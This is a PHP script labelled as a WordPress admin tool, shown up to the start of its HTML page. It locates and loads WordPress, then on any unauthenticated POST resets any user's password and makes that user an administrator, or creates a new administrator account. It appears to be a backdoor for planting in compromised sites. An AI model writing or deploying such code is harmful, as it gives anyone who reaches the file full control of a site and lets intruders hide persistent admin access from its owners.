<?php
/**
 * WP Admin Tool - English Version
 * Supports deep subdirectory placement.
 */

ini_set('display_errors', 0);
error_reporting(E_ALL);

$message = '';
$msg_type = '';

// --- WORDPRESS AUTO-DISCOVERY LOGIC ---

$wp_found = false;
$current_dir = dirname(__FILE__);
$max_levels = 10; // Max directory levels to go up
$level = 0;

while ($level < $max_levels) {
    // Check if wp-blog-header.php exists in current level
    if (file_exists($current_dir . '/wp-blog-header.php')) {
        // Found it! Load the files
        require_once($current_dir . '/wp-blog-header.php');
        require_once(ABSPATH . 'wp-includes/registration.php');
        require_once(ABSPATH . 'wp-includes/pluggable.php');
        require_once(ABSPATH . 'wp-includes/user.php');
        $wp_found = true;
        break; // Stop the loop
    }
    
    // Go up one level
    $current_dir = dirname($current_dir);
    $level++;
}

// --- END DISCOVERY LOGIC ---

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action_admin'])) {

    if (!$wp_found) {
        $message = "Error: Could not locate WordPress root files (wp-blog-header.php). Please make sure this script is inside a WordPress installation folder.";
        $msg_type = 'error';
    }

    if (empty($message)) {
        // take input
        $target_user = sanitize_text_field($_POST['username']);
        $new_pass    = $_POST['password'];
        $target_email= sanitize_email($_POST['email']);

        if (empty($target_user) || empty($new_pass)) {
            $message = "Error: Username and Password are required.";
            $msg_type = 'error';
        } else {
            // Check User
            $user = get_user_by('login', $target_user);

            // SCENARIO 1: UPDATE EXISTING USER
            if ($user) {
                wp_set_password($new_pass, $user->ID);
                $u_obj = new WP_User($user->ID);
                $u_obj->set_role('administrator');

                $message = "<strong>Success!</strong><br>User '{$target_user}' exists. Password has been reset and role set to Administrator.";
                $msg_type = 'success';
            } 
            // SCENARIO 2: CREATE NEW USER
            else {
                if (empty($target_email)) {
                    $message = "Error: Email is required for creating a new user.";
                    $msg_type = 'error';
                } elseif (email_exists($target_email)) {
                    $message = "Error: The email address '{$target_email}' is already in use.";
                    $msg_type = 'error';
                } else {
                    $user_id = wp_create_user($target_user, $new_pass, $target_email);
                    if (is_int($user_id)) {
                        $u_obj = new WP_User($user_id);
                        $u_obj->set_role('administrator');
                        $message = "<strong>Success!</strong><br>New Administrator user '{$target_user}' has been created.";
                        $msg_type = 'success';
                    } else {
                        $message = "System Error: Could not create user.";
                        $msg_type = 'error';
                    }
                }
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wordpress PTSMC</title>
